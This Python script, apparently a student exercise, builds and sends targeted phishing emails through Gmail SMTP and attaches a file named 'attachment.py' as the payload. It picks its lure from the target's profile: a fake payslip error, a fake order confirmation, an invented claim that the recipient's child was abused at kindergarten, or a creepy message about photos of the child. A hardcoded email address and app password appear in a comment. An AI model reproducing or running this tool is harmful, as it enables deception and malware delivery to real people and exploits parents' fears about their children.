import smtplib, ssl
import sys
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import requests


## read_file function


def search_str(file_path, word):
    with open(file_path, 'r') as file:
        # read all content of a file
        content = file.read()
        arr_content = content.splitlines()
        # check if string present in a file
        for line in arr_content:
            if word in line:
                if word == 'From':
                    return line[6:]
                elif word == 'To':
                    return line[4:]
                elif word == 'Subject':
                    return line[9:]
                elif word == 'Dear':
                    arr = line.split(" ")
                    return arr[1]

def Read_file(url):
    global name_from
    global name_to
    global subject
    global title
    response = requests.get(url)
    open("sample.txt", "wb").write(response.content)
    name_from = search_str('sample3.txt', 'From')
    name_to = search_str('sample3.txt', 'To')
    subject = search_str('sample3.txt', 'Subject')
    title = search_str('sample3.txt', 'Dear')


def main():

    smtp_server = "smtp.gmail.com"
    port = 587  # For starttls
    sender_email = "mcherbert255@gmail.com"


    password = input("password: ")
    # App_password: bjhrovvmmepzvhkz

    userName = sys.argv[1]
    mail_service = sys.argv[2]
    title = sys.argv[3]  # ms\mr\mrs\doctor\professor
    job = sys.argv[4]
    status = sys.argv[5]
    has_kids = sys.argv[6]  # yes\no

    target_mail = userName + '@' + mail_service
    msg = MIMEMultipart()

    msg['From'] = sender_email
    msg['To'] = target_mail


    if(has_kids=="no"):
        # check if url exist
        if len(sys.argv) == 8:
            url=sys.argv[7]
            Read_file(url)
            msg['Subject'] = subject
            text = f"Hey {title} {name_to}, \n The financial department had a bug in their systems.\
                                              \n It caused some payslips problems to several employees. \
                                              \n Please check that your payslip is correct for this month. \
                                              \n The payslip file attached to this mail. \
                                              \n Thanks, \
                                              \n {name_from}. "

        else:
            msg['Subject'] = "Payment confirmed!"
            text = f"Hey {title} {userName}, \n Thank you for buying our products, your order is confirmed.\
                                                   \n Order number: 47338859. \
                                                   \n Total Amount:5199$ \
                                                   \n Payment method: Credit card \
                                                   \n Your order Summary attached to this mail. \
                                                   \n This is an automatically generated email, please do not replay. "


    elif has_kids == "yes":
        kids = []
        for x in range(7,len(sys.argv)):
            if isinstance(x,int):
                kids.append(sys.argv[x])
        min_kid = int(min(kids))

        len_final=len(sys.argv)-1

        if isinstance(sys.argv[len_final], str) :
            # print(type(sys.argv[len_final]))
            # print(sys.argv[len_final])
            url=sys.argv[len_final]
            Read_file(url)
            msg['Subject'] = subject
            text = f"Hey {title} {name_to}, \n The financial department had a bug in their systems.\
                                                         \n It caused some payslips problems to several employees. \
                                                         \n Please check that your payslip is correct for this month. \
                                                         \n The payslip file attached to this mail. \
                                                         \n Thanks, \
                                                         \n {name_from}. "

        else:
            if min_kid < 6:
                msg['Subject'] = "A Concerned parent"
                text = f"Hey {title} {userName}, \n Our kids are together in the kindergarten .\
                                                       \n I've noticed for the last few weeks that my child returned home with signs of beating all over her body. \
                                                       \n Therefore I've hired a private investigator to find out how it happens.\
                                                       \n He found out that it was the Kindergarten Teacher. \
                                                       \n Your child was abused by her too. \
                                                       \n I have added the investigator's findings to this mail. \
                                                       \n I don't know what we can do about it, maybe you will."

            if min_kid > 5:
                msg['Subject'] = "Your kid is pretty"
                text = f"Hey {title} {userName}, \n Your child was contacting me through the internet and we talked for the last few months.\
                                                       \n During our conversations I've got a lot of pictures of you child that were sent willingly. \
                                                       \n All the pictures are attached to this mail.\
                                                       \n I like the way your kid looks. :) "

    body = MIMEText(text,)
    msg.attach(body)

    attachmentPath = "attachment.py"
    try:
        with open(attachmentPath, "rb") as attachment:
            p = MIMEApplication(attachment.read(), _subtype="txt")
            p.add_header('Content-Disposition', "attachment; filename= %s" % attachmentPath.split("\\")[-1])
            msg.attach(p)
    except Exception as e:
        print(str(e))

    msg_full = msg.as_string()
    # Create a secure SSL context
    context = ssl.create_default_context()
    # Try to log in to server and send email
    try:

        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()  # Can be omitted
        server.starttls(context=context)  # Secure the connection
        server.ehlo()  # Can be omitted
        server.login(sender_email, password)

        # message = 'Subject: {}\n\n{}'.format(SUBJECT, text)
        server.sendmail(sender_email, target_mail, msg_full)






        # TODO: Send email here
    except Exception as e:
        print("there is error")
        # Print any error messages to stdout
        print(e)
    finally:
        print("mail send success")
        server.quit()

if __name__ == '__main__':
    main()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
